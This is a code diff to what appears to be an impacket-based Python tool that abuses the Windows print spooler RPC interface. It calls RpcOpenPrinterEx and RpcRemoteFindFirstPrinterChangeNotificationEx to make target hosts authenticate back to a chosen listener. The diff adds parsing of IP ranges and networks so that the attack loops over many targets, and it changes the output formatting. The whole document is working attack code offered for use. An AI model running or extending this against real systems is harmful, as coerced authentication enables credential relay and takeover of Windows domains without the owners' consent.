@@ -12,6 +12,7 @@ from impacket.structure import Structure
 from impacket.dcerpc.v5 import transport
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 from impacket.uuid import uuidtup_to_bin
+from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
 
 
 # printer and listener struct
@@ -76,6 +77,39 @@ class RemoteFindFirstPrinterChangeNotificationEx(Structure):
 
 ##===========================================================================================================
 
+def parse_targets(target):
+    """
+    Parse provided targets
+    :param target: Targets
+    :return: List of IP addresses
+    """
+    if '-' in target:
+        ip_range = target.split('-')
+        try:
+            t = IPRange(ip_range[0], ip_range[1])
+        except AddrFormatError:
+            try:
+                start_ip = IPAddress(ip_range[0])
+
+                start_ip_words = list(start_ip.words)
+                start_ip_words[-1] = ip_range[1]
+                start_ip_words = [str(v) for v in start_ip_words]
+
+                end_ip = IPAddress('.'.join(start_ip_words))
+
+                t = IPRange(start_ip, end_ip)
+            except AddrFormatError:
+                t = target
+    else:
+        try:
+            t = IPNetwork(target)
+        except AddrFormatError:
+            t = target
+    if type(t) == IPNetwork or type(t) == IPRange:
+        return list(t)
+    else:
+        return [t.strip()]
+
 
 def connect(username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp, verbose=False):
     MSRPC_UUID_SPOOLSS = ('12345678-1234-ABCD-EF00-0123456789AB', '1.0')
@@ -93,26 +127,26 @@ def connect(username, password, domain, lmhash, nthash, target, doKerberos, dcHo
     dce = rpctransport.get_dce_rpc()
     dce.set_auth_type(RPC_C_AUTHN_WINNT)
     dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
-    print("[>] Connecting to %s ..." % stringBinding)
+    print("   [>] Connecting to %s ..." % stringBinding)
     try:
         dce.connect()
     except Exception as e:
         if verbose:
             raise
         else:
-            print("[!] %s" % str(e))
+            print("   [!] %s" % str(e))
         return None
-    print("[+] Connected!")
-    print("[+] Binding to %s" % MSRPC_UUID_SPOOLSS[0])
+    print("   [+] Connected!")
+    print("   [+] Binding to %s" % MSRPC_UUID_SPOOLSS[0])
     try:
         dce.bind(uuidtup_to_bin(MSRPC_UUID_SPOOLSS))
     except Exception as e:
         if verbose:
             raise
         else:
-            print("[!] %s" % str(e))
+            print("   [!] %s" % str(e))
         return None
-    print("[+] Successfully bound!")
+    print("   [+] Successfully bound!")
     return dce
 
 
@@ -203,74 +237,76 @@ if __name__ == '__main__':
         else:
             auth_nt_hash = options.auth_hashes
 
-    dce_conn = connect(
-        options.auth_username,
-        options.auth_password,
-        options.auth_domain,
-        auth_lm_hash,
-        auth_nt_hash,
-        options.target,
-        options.use_kerberos,
-        options.dc_ip,
-        options.target_ip,
-        verbose=options.verbose
-    )
-
-    if dce_conn is not None:
-        print("[*] Getting context handle ...")
-        context_handle = build_RpcOpenPrinterEx_struct(
-            username=options.auth_domain + "\\" + options.auth_username + "\x00",
-            client=options.listener + "\x00",
-            target=options.target + "\x00"
+    for target_ip in parse_targets(options.target):
+        print("[>] Attacking %s" % target_ip)
+        dce_conn = connect(
+            options.auth_username,
+            options.auth_password,
+            options.auth_domain,
+            auth_lm_hash,
+            auth_nt_hash,
+            target_ip,
+            options.use_kerberos,
+            options.dc_ip,
+            options.target_ip,
+            verbose=options.verbose
         )
-        handle = None
-        try:
-            context_handle = patch_impacket_structure_py3(context_handle)
-            if options.verbose:
-                print("[debug] DCERPC call opnum=%d, handle=%s" % (context_handle.opnum, binascii.hexlify(context_handle.getData()).decode('utf-8')))
-            dce_conn.call(context_handle.opnum, context_handle)
 
-            raw = dce_conn.recv()
-            if options.verbose:
-                print("[debug] Raw response: %s" % binascii.hexlify(raw).decode('utf-8'))
-            handle = raw[:20]
-            if options.verbose:
-                print("[debug] Handle is: %s" % binascii.hexlify(handle).decode('utf-8'))
-        except Exception as e:
-            if options.verbose:
-                raise
-            else:
-                print("[!] %s" % str(e))
-            dce_conn.disconnect()
-            sys.exit()
-        if handle is not None:
-            print("[*] Calling RpcRemoteFindFirstPrinterChangeNotificationEx ...")
-            options_container = (
-                b'\x04\x00\x02\x00'  # referent id
-                b'\x02\x00\x00\x00'  # version
-                b'\xce\x55\x00\x00'  # flags
-                b'\x02\x00\x00\x00'  # count
-                # notify options blob to unpack another day
-                b'\x08\x00\x02\x00\x02\x00\x00\x00\x00\x00\xce\x55\x00\x00'
-                b'\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x02\x00'
-                b'\x01\x00\x00\x00\xe0\x11\xbd\x8f\xce\x55\x00\x00\x01\x00'
-                b'\x00\x00\x10\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00'
-                b'\x01\x00\x00\x00\x00\x00'
+        if dce_conn is not None:
+            print("   [*] Getting context handle ...")
+            context_handle = build_RpcOpenPrinterEx_struct(
+                username=options.auth_domain + "\\" + options.auth_username + "\x00",
+                client=options.listener + "\x00",
+                target=options.target + "\x00"
             )
-            # call function to get method core
-            query = build_RpcRemoteFindFirstPrinterChangeNotificationEx_struct(options.listener)
-            query = patch_impacket_structure_py3(query)
-            full_query = handle + query.getData() + options_container
+            handle = None
             try:
-                dce_conn.call(query.opnum, full_query)
+                context_handle = patch_impacket_structure_py3(context_handle)
+                if options.verbose:
+                    print("   [debug] DCERPC call opnum=%d, handle=%s" % (context_handle.opnum, binascii.hexlify(context_handle.getData()).decode('utf-8')))
+                dce_conn.call(context_handle.opnum, context_handle)
+
                 raw = dce_conn.recv()
                 if options.verbose:
-                    print("[debug] Raw response: %s" % binascii.hexlify(raw).decode('utf-8'))
+                    print("   [debug] Raw response: %s" % binascii.hexlify(raw).decode('utf-8'))
+                handle = raw[:20]
+                if options.verbose:
+                    print("   [debug] Handle is: %s" % binascii.hexlify(handle).decode('utf-8'))
             except Exception as e:
                 if options.verbose:
                     raise
                 else:
-                    print("[!] %s" % str(e))
+                    print("   [!] %s" % str(e))
                 dce_conn.disconnect()
-            print("[+] Done!")
-        dce_conn.disconnect()
+                sys.exit()
+            if handle is not None:
+                print("   [*] Calling RpcRemoteFindFirstPrinterChangeNotificationEx ...")
+                options_container = (
+                    b'\x04\x00\x02\x00'  # referent id
+                    b'\x02\x00\x00\x00'  # version
+                    b'\xce\x55\x00\x00'  # flags
+                    b'\x02\x00\x00\x00'  # count
+                    # notify options blob to unpack another day
+                    b'\x08\x00\x02\x00\x02\x00\x00\x00\x00\x00\xce\x55\x00\x00'
+                    b'\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0c\x00\x02\x00'
+                    b'\x01\x00\x00\x00\xe0\x11\xbd\x8f\xce\x55\x00\x00\x01\x00'
+                    b'\x00\x00\x10\x00\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00'
+                    b'\x01\x00\x00\x00\x00\x00'
+                )
+                # call function to get method core
+                query = build_RpcRemoteFindFirstPrinterChangeNotificationEx_struct(options.listener)
+                query = patch_impacket_structure_py3(query)
+                full_query = handle + query.getData() + options_container
+                try:
+                    dce_conn.call(query.opnum, full_query)
+                    raw = dce_conn.recv()
+                    if options.verbose:
+                        print("   [debug] Raw response: %s" % binascii.hexlify(raw).decode('utf-8'))
+                except Exception as e:
+                    if options.verbose:
+                        raise
+                    else:
+                        print("   [!] %s" % str(e))
+                    dce_conn.disconnect()
+                print("   [+] Done!")
+            dce_conn.disconnect()
